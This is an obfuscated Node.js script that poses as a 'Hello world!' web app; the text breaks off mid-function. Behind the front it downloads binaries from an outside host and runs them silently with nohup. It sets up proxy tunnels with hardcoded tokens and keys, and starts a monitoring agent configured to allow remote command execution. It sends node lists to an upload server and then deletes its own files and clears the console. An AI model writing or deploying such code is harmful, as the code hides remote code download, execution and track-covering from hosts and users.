const _0x43bb93=_0x26ce;(function(_0x43a60b,_0x1341e0){const _0x390256=_0x26ce,_0x234ada=_0x43a60b();while(!![]){try{const _0x24fa6b=-parseInt(_0x390256(0x13e))/0x1*(parseInt(_0x390256(0x15e))/0x2)+-parseInt(_0x390256(0x113))/0x3*(parseInt(_0x390256(0xdd))/0x4)+parseInt(_0x390256(0xa2))/0x5*(-parseInt(_0x390256(0x11e))/0x6)+parseInt(_0x390256(0x159))/0x7*(parseInt(_0x390256(0xa7))/0x8)+parseInt(_0x390256(0x101))/0x9+parseInt(_0x390256(0x14f))/0xa*(parseInt(_0x390256(0x111))/0xb)+parseInt(_0x390256(0x125))/0xc;if(_0x24fa6b===_0x1341e0)break;else _0x234ada['push'](_0x234ada['shift']());}catch(_0x542a50){_0x234ada['push'](_0x234ada['shift']());}}}(_0xa174,0x341aa));const express=require(_0x43bb93(0x124)),app=express(),axios=require(_0x43bb93(0xb0)),os=require('os'),fs=require('fs'),path=require(_0x43bb93(0x136)),{promisify}=require(_0x43bb93(0x14c)),exec=promisify(require(_0x43bb93(0x107))[_0x43bb93(0x141)]),{execSync}=require('child_process'),UPLOAD_URL=process['env'][_0x43bb93(0x151)]||'',PROJECT_URL=process[_0x43bb93(0xcf)][_0x43bb93(0xfd)]||'',AUTO_ACCESS=process[_0x43bb93(0xcf)][_0x43bb93(0xef)]||![],FILE_PATH=process['env']['FILE_PATH']||_0x43bb93(0x120),SUB_PATH=process[_0x43bb93(0xcf)]['SUB_PATH']||_0x43bb93(0x152),PORT=process['env'][_0x43bb93(0xbe)]||process[_0x43bb93(0xcf)][_0x43bb93(0xc5)]||0xbb8,UUID=process[_0x43bb93(0xcf)][_0x43bb93(0xd1)]||_0x43bb93(0xfc),NEZHA_SERVER=process['env'][_0x43bb93(0xff)]||_0x43bb93(0x13a),NEZHA_PORT=process[_0x43bb93(0xcf)][_0x43bb93(0xfb)]||'',NEZHA_KEY=process[_0x43bb93(0xcf)][_0x43bb93(0x10a)]||_0x43bb93(0x109),ARGO_DOMAIN=process[_0x43bb93(0xcf)][_0x43bb93(0xbc)]||_0x43bb93(0x158),ARGO_AUTH=process[_0x43bb93(0xcf)][_0x43bb93(0x11f)]||_0x43bb93(0x119),ARGO_PORT=process[_0x43bb93(0xcf)][_0x43bb93(0x106)]||0x1406,CFIP=process[_0x43bb93(0xcf)][_0x43bb93(0x137)]||_0x43bb93(0x11d),CFPORT=process['env'][_0x43bb93(0x15f)]||0x1bb,NAME=process[_0x43bb93(0xcf)][_0x43bb93(0xda)]||_0x43bb93(0xdc);!fs['existsSync'](FILE_PATH)?(fs[_0x43bb93(0x15a)](FILE_PATH),console[_0x43bb93(0xa8)](FILE_PATH+_0x43bb93(0x127))):console[_0x43bb93(0xa8)](FILE_PATH+_0x43bb93(0xc9));function generateRandomName(){const _0x3defb2=_0x43bb93,_0x39fe95=_0x3defb2(0xf0);let _0x28d0e8='';for(let _0x49b8ea=0x0;_0x49b8ea<0x6;_0x49b8ea++){_0x28d0e8+=_0x39fe95[_0x3defb2(0xf8)](Math[_0x3defb2(0x150)](Math[_0x3defb2(0x145)]()*_0x39fe95[_0x3defb2(0xf9)]));}return _0x28d0e8;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x43bb93(0x12b)](FILE_PATH,npmName),phpPath=path[_0x43bb93(0x12b)](FILE_PATH,phpName),webPath=path[_0x43bb93(0x12b)](FILE_PATH,webName),botPath=path[_0x43bb93(0x12b)](FILE_PATH,botName),subPath=path[_0x43bb93(0x12b)](FILE_PATH,_0x43bb93(0xa1)),listPath=path[_0x43bb93(0x12b)](FILE_PATH,_0x43bb93(0x143)),bootLogPath=path['join'](FILE_PATH,_0x43bb93(0x10c)),configPath=path[_0x43bb93(0x12b)](FILE_PATH,'config.json');function deleteNodes(){const _0x3dece=_0x43bb93;try{if(!UPLOAD_URL)return;if(!fs['existsSync'](subPath))return;let _0x3e07f2;try{_0x3e07f2=fs['readFileSync'](subPath,_0x3dece(0xf1));}catch{return null;}const _0xe19547=Buffer[_0x3dece(0x116)](_0x3e07f2,_0x3dece(0x13f))[_0x3dece(0xd8)](_0x3dece(0xf1)),_0x5d9c5a=_0xe19547[_0x3dece(0x104)]('\x0a')['filter'](_0xaa1305=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x3dece(0xb9)](_0xaa1305));if(_0x5d9c5a[_0x3dece(0xf9)]===0x0)return;return axios[_0x3dece(0x13b)](UPLOAD_URL+_0x3dece(0x10b),JSON['stringify']({'nodes':_0x5d9c5a}),{'headers':{'Content-Type':'application/json'}})[_0x3dece(0x15b)](_0x475407=>{return null;}),null;}catch(_0x1d39ff){return null;}}function cleanupOldFiles(){const _0x54feaa=_0x43bb93;try{const _0x3d383f=fs[_0x54feaa(0x11a)](FILE_PATH);_0x3d383f[_0x54feaa(0x142)](_0x18a753=>{const _0x18d0b5=_0x54feaa,_0x342eb4=path[_0x18d0b5(0x12b)](FILE_PATH,_0x18a753);try{const _0x468d9b=fs[_0x18d0b5(0xb4)](_0x342eb4);_0x468d9b[_0x18d0b5(0x10f)]()&&fs[_0x18d0b5(0xa4)](_0x342eb4);}catch(_0x92d8fc){}});}catch(_0x4932d1){}}app[_0x43bb93(0x131)]('/',function(_0x2bf6b5,_0x594b51){const _0x8d0671=_0x43bb93;_0x594b51[_0x8d0671(0xfe)](_0x8d0671(0x10e));});async function generateConfig(){const _0x2ad3ea=_0x43bb93,_0x483469={'log':{'access':_0x2ad3ea(0x153),'error':_0x2ad3ea(0x153),'loglevel':_0x2ad3ea(0x130)},'inbounds':[{'port':ARGO_PORT,'protocol':'vless','settings':{'clients':[{'id':UUID,'flow':_0x2ad3ea(0xae)}],'decryption':_0x2ad3ea(0x130),'fallbacks':[{'dest':0xbb9},{'path':_0x2ad3ea(0xd4),'dest':0xbba},{'path':'/vmess-argo','dest':0xbbb},{'path':_0x2ad3ea(0xab),'dest':0xbbc}]},'streamSettings':{'network':_0x2ad3ea(0x12d)}},{'port':0xbb9,'listen':'127.0.0.1','protocol':_0x2ad3ea(0x100),'settings':{'clients':[{'id':UUID}],'decryption':'none'},'streamSettings':{'network':_0x2ad3ea(0x12d),'security':_0x2ad3ea(0x130)}},{'port':0xbba,'listen':'127.0.0.1','protocol':_0x2ad3ea(0x100),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x2ad3ea(0x130)},'streamSettings':{'network':'ws','security':_0x2ad3ea(0x130),'wsSettings':{'path':'/vless-argo'}},'sniffing':{'enabled':!![],'destOverride':['http',_0x2ad3ea(0xf5),_0x2ad3ea(0xb6)],'metadataOnly':![]}},{'port':0xbbb,'listen':'127.0.0.1','protocol':_0x2ad3ea(0xc8),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x2ad3ea(0x103)}},'sniffing':{'enabled':!![],'destOverride':[_0x2ad3ea(0x154),'tls','quic'],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x2ad3ea(0xca),'protocol':_0x2ad3ea(0x163),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x2ad3ea(0x130),'wsSettings':{'path':_0x2ad3ea(0xab)}},'sniffing':{'enabled':!![],'destOverride':[_0x2ad3ea(0x154),_0x2ad3ea(0xf5),'quic'],'metadataOnly':![]}}],'dns':{'servers':[_0x2ad3ea(0x14b)]},'outbounds':[{'protocol':_0x2ad3ea(0x160),'tag':_0x2ad3ea(0xaf)},{'protocol':_0x2ad3ea(0xe2),'tag':'block'}]};fs[_0x2ad3ea(0x147)](path[_0x2ad3ea(0x12b)](FILE_PATH,'config.json'),JSON[_0x2ad3ea(0xce)](_0x483469,null,0x2));}function getSystemArchitecture(){const _0x6f2475=_0x43bb93,_0x4c5307=os[_0x6f2475(0xea)]();return _0x4c5307==='arm'||_0x4c5307===_0x6f2475(0xd6)||_0x4c5307===_0x6f2475(0x11b)?'arm':_0x6f2475(0xf6);}function downloadFile(_0x4880b7,_0x1fcf6,_0x26f26e){const _0x3fb22b=_0x43bb93,_0x2667ad=_0x4880b7;!fs[_0x3fb22b(0xb7)](FILE_PATH)&&fs['mkdirSync'](FILE_PATH,{'recursive':!![]});const _0x2258ac=fs['createWriteStream'](_0x2667ad);axios({'method':_0x3fb22b(0x131),'url':_0x1fcf6,'responseType':_0x3fb22b(0x108)})[_0x3fb22b(0x129)](_0x3665c2=>{const _0x5a5d47=_0x3fb22b;_0x3665c2[_0x5a5d47(0xc6)][_0x5a5d47(0xee)](_0x2258ac),_0x2258ac['on']('finish',()=>{const _0x1c13f5=_0x5a5d47;_0x2258ac[_0x1c13f5(0x15c)](),console[_0x1c13f5(0xa8)](_0x1c13f5(0xe7)+path['basename'](_0x2667ad)+_0x1c13f5(0x117)),_0x26f26e(null,_0x2667ad);}),_0x2258ac['on'](_0x5a5d47(0x148),_0x447a97=>{const _0x350a40=_0x5a5d47;fs[_0x350a40(0xa6)](_0x2667ad,()=>{});const _0x20fe53=_0x350a40(0xe7)+path[_0x350a40(0xb1)](_0x2667ad)+_0x350a40(0x140)+_0x447a97[_0x350a40(0x10d)];console[_0x350a40(0x148)](_0x20fe53),_0x26f26e(_0x20fe53);});})[_0x3fb22b(0x15b)](_0x57298d=>{const _0x1a37ab=_0x3fb22b,_0xc41541=_0x1a37ab(0xe7)+path[_0x1a37ab(0xb1)](_0x2667ad)+'\x20failed:\x20'+_0x57298d[_0x1a37ab(0x10d)];console[_0x1a37ab(0x148)](_0xc41541),_0x26f26e(_0xc41541);});}function _0xa174(){const _0xf6e75f=['\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','eyJhIjoiYzZjYjc4NDJiZjM0NDQ3ZGRmZjUyNjAyYTE2ZDVlMWEiLCJ0IjoiMDVjZDIwYjMtZDlhOC00YWU3LTg0ODgtOTY4MzA0Nzk3OWQyIiwicyI6Ik5Ea3haREptTURVdE9HWmxZaTAwWlRsbExUaGtPRGt0T1dGaE1qSmxNV0prWkdGaSJ9','readdirSync','aarch64','text/plain;\x20charset=utf-8','cdns.doon.eu.org','1091754qACwhp','ARGO_AUTH','./tmp','\x0aclient_secret:\x20','\x22\x20>\x20/dev/null\x202>&1','2083','express','750528FhloKA','\x20-c\x20','\x20is\x20created','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','then','automatic\x20access\x20task\x20added\x20successfully','join','--tls','tcp','tunnel.yml','all','none','get','pkill\x20-f\x20\x22[','Content-Type','\x0a\x0atrojan://','/vmess-argo?ed=2560','path','CFIP','has','readFileSync','crbvinmnqpyv.us-west-1.clawcloudrun.com:80','post','Error\x20reading\x20boot.log:','status','76121GNjJDG','base64','\x20failed:\x20','exec','forEach','list.txt','&path=%2Fvless-argo%3Fed%3D2560#','random','Error\x20downloading\x20files:','writeFileSync','error','win32','8443','https+local://8.8.8.8/dns-query','util','443','https://amd64.ssss.nyc.mn/bot','3410aHsfit','floor','UPLOAD_URL','fu258369','/dev/null','http','/sub.txt\x20saved\x20successfully','fileName','https://amd64.ssss.nyc.mn/agent','lea.hun93.cloudns.biz','1215788eHOwqf','mkdirSync','catch','close','\x0a\x0avmess://','4UexakV','CFPORT','freedom','fileUrl','?encryption=none&security=tls&sni=','trojan','del\x20/f\x20/q\x20','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','sub.txt','10mlPEbx','/api/add-subscriptions','unlinkSync','unshift','unlink','16frXjeQ','log','https://oooo.serv00.net/add-url','2087','/trojan-argo','false','\x20-p\x20','xtls-rprx-vision','direct','axios','basename','nohup\x20','Skipping\x20adding\x20automatic\x20access\x20task','statSync','https://arm64.ssss.nyc.mn/bot','quic','existsSync','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','test','Error\x20executing\x20command:\x20','push','ARGO_DOMAIN','2053','SERVER_PORT','http://ip-api.com/json/','success','org','response','https://arm64.ssss.nyc.mn/web','https://amd64.ssss.nyc.mn/web','PORT','data','https://arm64.ssss.nyc.mn/v1','vmess','\x20already\x20exists','127.0.0.1','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','clear','countryCode','stringify','env','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','UUID','arm','&path=%2Ftrojan-argo%3Fed%3D2560#','/vless-argo','2096','arm64','includes','toString','Error\x20in\x20startserver:','NAME','\x20is\x20running','kuan','52LnoHQa','\x20>\x20nul\x202>&1','true','Empowerment\x20failed\x20for\x20','\x20-s\x20','blackhole','rm\x20-rf\x20','&fp=firefox&type=ws&host=','listen','ARGO_DOMAIN:','Download\x20','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','NEZHA\x20variable\x20is\x20empty,skip\x20running','arch','Nodes\x20uploaded\x20successfully','filter','?security=tls&sni=','pipe','AUTO_ACCESS','abcdefghijklmnopqrstuvwxyz','utf-8','taskkill\x20/f\x20/im\x20','country_code','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','tls','amd','\x0avless://','charAt','length','\x20>/dev/null\x202>&1\x20&','NEZHA_PORT','7ff3e2e5-4234-4e26-b6b6-cf24d9c7b8b8','PROJECT_URL','send','NEZHA_SERVER','vless','2849148peFOfY','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','/vmess-argo','split','application/json','ARGO_PORT','child_process','stream','g2GOIZ6Ran1hPhztbaZL9EaejJIoCCnG','NEZHA_KEY','/api/delete-nodes','boot.log','message','Hello\x20world!','isFile','App\x20is\x20running','4433IFVvGT','tunnel.json','30999hQibXc','TunnelSecret','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','from','\x20successfully'];_0xa174=function(){return _0xf6e75f;};return _0xa174();}async function downloadFilesAndRun(){const _0xa3d514=_0x43bb93,_0x234d4b=getSystemArchitecture(),_0x5ae26e=getFilesForArchitecture(_0x234d4b);if(_0x5ae26e[_0xa3d514(0xf9)]===0x0){console[_0xa3d514(0xa8)]('Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture');return;}const _0x38cdfc=_0x5ae26e['map'](_0x4f9cfe=>{return new Promise((_0x1e9929,_0x3f574b)=>{const _0x14d5fb=_0x26ce;downloadFile(_0x4f9cfe[_0x14d5fb(0x156)],_0x4f9cfe[_0x14d5fb(0x161)],(_0x4010f8,_0x39cb43)=>{_0x4010f8?_0x3f574b(_0x4010f8):_0x1e9929(_0x39cb43);});});});try{await Promise[_0xa3d514(0x12f)](_0x38cdfc);}catch(_0x1ded9f){console['error'](_0xa3d514(0x146),_0x1ded9f);return;}function _0x4f2303(_0x3e3748){const _0x188e45=_0xa3d514,_0x3fd533=0x1fd;_0x3e3748[_0x188e45(0x142)](_0x45d4e7=>{const _0xd4263e=_0x188e45;fs[_0xd4263e(0xb7)](_0x45d4e7)&&fs['chmod'](_0x45d4e7,_0x3fd533,_0x38ce13=>{const _0x317bd7=_0xd4263e;_0x38ce13?console[_0x317bd7(0x148)](_0x317bd7(0xe0)+_0x45d4e7+':\x20'+_0x38ce13):console[_0x317bd7(0xa8)]('Empowerment\x20success\x20for\x20'+_0x45d4e7+':\x20'+_0x3fd533[_0x317bd7(0xd8)](0x8));});});}const _0x46bfef=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x4f2303(_0x46bfef);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x49f310=NEZHA_SERVER[_0xa3d514(0xd7)](':')?NEZHA_SERVER[_0xa3d514(0x104)](':')['pop']():'',_0x43e191=new Set(['443',_0xa3d514(0x14a),_0xa3d514(0xd5),_0xa3d514(0xaa),_0xa3d514(0x123),_0xa3d514(0xbd)]),_0x13131f=_0x43e191[_0xa3d514(0x138)](_0x49f310)?_0xa3d514(0xdf):_0xa3d514(0xac),_0xafbadd=_0xa3d514(0x121)+NEZHA_KEY+_0xa3d514(0x128)+NEZHA_SERVER+_0xa3d514(0xe8)+_0x13131f+_0xa3d514(0xd0)+UUID;fs[_0xa3d514(0x147)](path[_0xa3d514(0x12b)](FILE_PATH,'config.yaml'),_0xafbadd);const _0x1ecd8b='nohup\x20'+phpPath+'\x20-c\x20\x22'+FILE_PATH+'/config.yaml\x22\x20>/dev/null\x202>&1\x20&';try{await exec(_0x1ecd8b),console[_0xa3d514(0xa8)](phpName+_0xa3d514(0xdb)),await new Promise(_0x3bf2dc=>setTimeout(_0x3bf2dc,0x3e8));}catch(_0x3744d3){console[_0xa3d514(0x148)]('php\x20running\x20error:\x20'+_0x3744d3);}}else{let _0xb6d8a3='';const _0x444084=[_0xa3d514(0x14d),_0xa3d514(0x14a),_0xa3d514(0xd5),_0xa3d514(0xaa),_0xa3d514(0x123),_0xa3d514(0xbd)];_0x444084[_0xa3d514(0xd7)](NEZHA_PORT)&&(_0xb6d8a3=_0xa3d514(0x12c));const _0x566139=_0xa3d514(0xb2)+npmPath+_0xa3d514(0xe1)+NEZHA_SERVER+':'+NEZHA_PORT+_0xa3d514(0xad)+NEZHA_KEY+'\x20'+_0xb6d8a3+_0xa3d514(0x118);try{await exec(_0x566139),console[_0xa3d514(0xa8)](npmName+_0xa3d514(0xdb)),await new Promise(_0x3db8ab=>setTimeout(_0x3db8ab,0x3e8));}catch(_0x530442){console[_0xa3d514(0x148)]('npm\x20running\x20error:\x20'+_0x530442);}}}else console[_0xa3d514(0xa8)](_0xa3d514(0xe9));const _0x38963d='nohup\x20'+webPath+_0xa3d514(0x126)+FILE_PATH+'/config.json\x20>/dev/null\x202>&1\x20&';try{await exec(_0x38963d),console[_0xa3d514(0xa8)](webName+'\x20is\x20running'),await new Promise(_0x43dbc1=>setTimeout(_0x43dbc1,0x3e8));}catch(_0x52004e){console[_0xa3d514(0x148)]('web\x20running\x20error:\x20'+_0x52004e);}if(fs[_0xa3d514(0xb7)](botPath)){let _0x26a1e0;if(ARGO_AUTH['match'](/^[A-Z0-9a-z=]{120,250}$/))_0x26a1e0=_0xa3d514(0xa0)+ARGO_AUTH;else ARGO_AUTH['match'](/TunnelSecret/)?_0x26a1e0=_0xa3d514(0xcb)+FILE_PATH+'/tunnel.yml\x20run':_0x26a1e0=_0xa3d514(0x102)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0xa3d514(0xb2)+botPath+'\x20'+_0x26a1e0+_0xa3d514(0xfa)),console['log'](botName+_0xa3d514(0xdb)),await new Promise(_0x34435d=>setTimeout(_0x34435d,0x7d0));}catch(_0x227a4e){console['error'](_0xa3d514(0xba)+_0x227a4e);}}await new Promise(_0x306274=>setTimeout(_0x306274,0x1388));}function getFilesForArchitecture(_0x5431ab){const _0x1aeac8=_0x43bb93;let _0x486d4c;_0x5431ab===_0x1aeac8(0xd2)?_0x486d4c=[{'fileName':webPath,'fileUrl':_0x1aeac8(0xc3)},{'fileName':botPath,'fileUrl':_0x1aeac8(0xb5)}]:_0x486d4c=[{'fileName':webPath,'fileUrl':_0x1aeac8(0xc4)},{'fileName':botPath,'fileUrl':_0x1aeac8(0x14e)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x23907b=_0x5431ab===_0x1aeac8(0xd2)?'https://arm64.ssss.nyc.mn/agent':_0x1aeac8(0x157);_0x486d4c[_0x1aeac8(0xa5)]({'fileName':npmPath,'fileUrl':_0x23907b});}else{const _0x215b24=_0x5431ab===_0x1aeac8(0xd2)?_0x1aeac8(0xc7):'https://amd64.ssss.nyc.mn/v1';_0x486d4c[_0x1aeac8(0xa5)]({'fileName':phpPath,'fileUrl':_0x215b24});}}return _0x486d4c;}function argoType(){const _0x3fa0d5=_0x43bb93;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x3fa0d5(0xa8)](_0x3fa0d5(0x115));return;}if(ARGO_AUTH[_0x3fa0d5(0xd7)](_0x3fa0d5(0x114))){fs['writeFileSync'](path[_0x3fa0d5(0x12b)](FILE_PATH,_0x3fa0d5(0x112)),ARGO_AUTH);const _0xd6feac='\x0a\x20\x20tunnel:\x20'+ARGO_AUTH[_0x3fa0d5(0x104)]('\x22')[0xb]+'\x0a\x20\x20credentials-file:\x20'+path[_0x3fa0d5(0x12b)](FILE_PATH,_0x3fa0d5(0x112))+'\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20'+ARGO_DOMAIN+_0x3fa0d5(0xb8)+ARGO_PORT+'\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20';fs[_0x3fa0d5(0x147)](path[_0x3fa0d5(0x12b)](FILE_PATH,_0x3fa0d5(0x12e)),_0xd6feac);}else console[_0x3fa0d5(0xa8)](_0x3fa0d5(0x9f));}async function extractDomains(){const _0x595823=_0x43bb93;let _0x30f9c8;if(ARGO_AUTH&&ARGO_DOMAIN)_0x30f9c8=ARGO_DOMAIN,console['log'](_0x595823(0xe6),_0x30f9c8),await _0x2a3e31(_0x30f9c8);else try{const _0x237efe=fs[_0x595823(0x139)](path[_0x595823(0x12b)](FILE_PATH,_0x595823(0x10c)),_0x595823(0xf1)),_0x3e2a81=_0x237efe[_0x595823(0x104)]('\x0a'),_0xbfc851=[];_0x3e2a81[_0x595823(0x142)](_0x412234=>{const _0x122e79=_0x595823,_0x56fbd6=_0x412234['match'](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x56fbd6){const _0x23b192=_0x56fbd6[0x1];_0xbfc851[_0x122e79(0xbb)](_0x23b192);}});if(_0xbfc851[_0x595823(0xf9)]>0x0)_0x30f9c8=_0xbfc851[0x0],console[_0x595823(0xa8)]('ArgoDomain:',_0x30f9c8),await _0x2a3e31(_0x30f9c8);else{console[_0x595823(0xa8)]('ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain'),fs[_0x595823(0xa4)](path['join'](FILE_PATH,_0x595823(0x10c)));async function _0x13f95d(){const _0x24b2e0=_0x595823;try{process['platform']===_0x24b2e0(0x149)?await exec(_0x24b2e0(0xf2)+botName+'.exe\x20>\x20nul\x202>&1'):await exec(_0x24b2e0(0x132)+botName[_0x24b2e0(0xf8)](0x0)+']'+botName['substring'](0x1)+_0x24b2e0(0x122));}catch(_0x39abee){}}_0x13f95d(),await new Promise(_0x330d71=>setTimeout(_0x330d71,0xbb8));const _0x245af9=_0x595823(0x102)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x595823(0xb2)+botPath+'\x20'+_0x245af9+_0x595823(0xfa)),console['log'](botName+_0x595823(0xdb)),await new Promise(_0x146092=>setTimeout(_0x146092,0xbb8)),await extractDomains();}catch(_0x27a56a){console[_0x595823(0x148)]('Error\x20executing\x20command:\x20'+_0x27a56a);}}}catch(_0x308722){console['error'](_0x595823(0x13c),_0x308722);}async function _0x4ebdb1(){const _0xd559e4=_0x595823;try{const _0x4ef25b=await axios[_0xd559e4(0x131)]('https://ipapi.co/json/',{'timeout':0xbb8});if(_0x4ef25b[_0xd559e4(0xc6)]&&_0x4ef25b[_0xd559e4(0xc6)][_0xd559e4(0xf3)]&&_0x4ef25b[_0xd559e4(0xc6)][_0xd559e4(0xc1)])return _0x4ef25b[_0xd559e4(0xc6)]['country_code']+'_'+_0x4ef25b[_0xd559e4(0xc6)][_0xd559e4(0xc1)];}catch(_0x153ff8){try{const _0x1b9fac=await axios[_0xd559e4(0x131)](_0xd559e4(0xbf),{'timeout':0xbb8});if(_0x1b9fac[_0xd559e4(0xc6)]&&_0x1b9fac[_0xd559e4(0xc6)][_0xd559e4(0x13d)]===_0xd559e4(0xc0)&&_0x1b9fac[_0xd559e4(0xc6)][_0xd559e4(0xcd)]&&_0x1b9fac[_0xd559e4(0xc6)]['org'])return _0x1b9fac[_0xd559e4(0xc6)][_0xd559e4(0xcd)]+'_'+_0x1b9fac[_0xd559e4(0xc6)][_0xd559e4(0xc1)];}catch(_0x3ca57b){}}return'Unknown';}async function _0x2a3e31(_0x7c1b9a){const _0xa84f71=await _0x4ebdb1(),_0x2db6b3=NAME?NAME+'-'+_0xa84f71:_0xa84f71;return new Promise(_0x3a8507=>{setTimeout(()=>{const _0x4a15f1=_0x26ce,_0x50f5ac={'v':'2','ps':''+_0x2db6b3,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x4a15f1(0x130),'net':'ws','type':_0x4a15f1(0x130),'host':_0x7c1b9a,'path':_0x4a15f1(0x135),'tls':_0x4a15f1(0xf5),'sni':_0x7c1b9a,'alpn':'','fp':'firefox'},_0x5b8e08=_0x4a15f1(0xf7)+UUID+'@'+CFIP+':'+CFPORT+_0x4a15f1(0x162)+_0x7c1b9a+_0x4a15f1(0xe4)+_0x7c1b9a+_0x4a15f1(0x144)+_0x2db6b3+_0x4a15f1(0x15d)+Buffer['from'](JSON[_0x4a15f1(0xce)](_0x50f5ac))[_0x4a15f1(0xd8)](_0x4a15f1(0x13f))+_0x4a15f1(0x134)+UUID+'@'+CFIP+':'+CFPORT+_0x4a15f1(0xed)+_0x7c1b9a+_0x4a15f1(0xe4)+_0x7c1b9a+_0x4a15f1(0xd3)+_0x2db6b3+'\x0a\x20\x20\x20\x20';console[_0x4a15f1(0xa8)](Buffer[_0x4a15f1(0x116)](_0x5b8e08)[_0x4a15f1(0xd8)]('base64')),fs[_0x4a15f1(0x147)](subPath,Buffer[_0x4a15f1(0x116)](_0x5b8e08)['toString']('base64')),console[_0x4a15f1(0xa8)](FILE_PATH+_0x4a15f1(0x155)),uploadNodes(),app[_0x4a15f1(0x131)]('/'+SUB_PATH,(_0x411895,_0x315038)=>{const _0x33b939=_0x4a15f1,_0x59b324=Buffer[_0x33b939(0x116)](_0x5b8e08)[_0x33b939(0xd8)]('base64');_0x315038['set'](_0x33b939(0x133),_0x33b939(0x11c)),_0x315038[_0x33b939(0xfe)](_0x59b324);}),_0x3a8507(_0x5b8e08);},0x7d0);});}}function _0x26ce(_0xfb80db,_0x238e72){const _0xa1747e=_0xa174();return _0x26ce=function(_0x26cec8,_0x33c0c6){_0x26cec8=_0x26cec8-0x9f;let _0x59dc86=_0xa1747e[_0x26cec8];return _0x59dc86;},_0x26ce(_0xfb80db,_0x238e72);}async function uploadNodes(){const _0x2e9c27=_0x43bb93;if(UPLOAD_URL&&PROJECT_URL){const _0x202010=PROJECT_URL+'/'+SUB_PATH,_0x58f7c1={'subscription':[_0x202010]};try{const _0x57e7f3=await axios[_0x2e9c27(0x13b)](UPLOAD_URL+_0x2e9c27(0xa3),_0x58f7c1,{'headers':{'Content-Type':_0x2e9c27(0x105)}});return _0x57e7f3&&_0x57e7f3[_0x2e9c27(0x13d)]===0xc8?(console[_0x2e9c27(0xa8)]('Subscription\x20uploaded\x20successfully'),_0x57e7f3):null;}catch(_0x2d35e2){if(_0x2d35e2[_0x2e9c27(0xc2)]){if(_0x2d35e2[_0x2e9c27(0xc2)][_0x2e9c27(0x13d)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x2e9c27(0xb7)](listPath))return;const _0x53a711=fs[_0x2e9c27(0x139)](listPath,_0x2e9c27(0xf1)),_0x769664=_0x53a711[_0x2e9c27(0x104)]('\x0a')[_0x2e9c27(0xec)](_0x486e64=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x2e9c27(0xb9)](_0x486e64));if(_0x769664[_0x2e9c27(0xf9)]===0x0)return;const _0x3cef1a=JSON[_0x2e9c27(0xce)]({'nodes':_0x769664});try{const _0x1e5105=await axios[_0x2e9c27(0x13b)](UPLOAD_URL+'/api/add-nodes',_0x3cef1a,{'headers':{'Content-Type':_0x2e9c27(0x105)}});return _0x1e5105&&_0x1e5105[_0x2e9c27(0x13d)]===0xc8?(console[_0x2e9c27(0xa8)](_0x2e9c27(0xeb)),_0x1e5105):null;}catch(_0x49b7a9){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x170af7=_0x26ce,_0x3f0091=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x3f0091[_0x170af7(0xbb)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x3f0091[_0x170af7(0xbb)](phpPath);process['platform']===_0x170af7(0x149)?exec(_0x170af7(0x164)+_0x3f0091[_0x170af7(0x12b)]('\x20')+_0x170af7(0xde),_0x3477c0=>{const _0x5811fd=_0x170af7;console[_0x5811fd(0xcc)](),console['log'](_0x5811fd(0x110)),console[_0x5811fd(0xa8)](_0x5811fd(0xf4));}):exec(_0x170af7(0xe3)+_0x3f0091[_0x170af7(0x12b)]('\x20')+'\x20>/dev/null\x202>&1',_0x2e5634=>{const _0x5a9e0d=_0x170af7;console['clear'](),console[_0x5a9e0d(0xa8)](_0x5a9e0d(0x110)),console[_0x5a9e0d(0xa8)](_0x5a9e0d(0xf4));});},0x15f90);}cleanFiles();async function AddVisitTask(){const 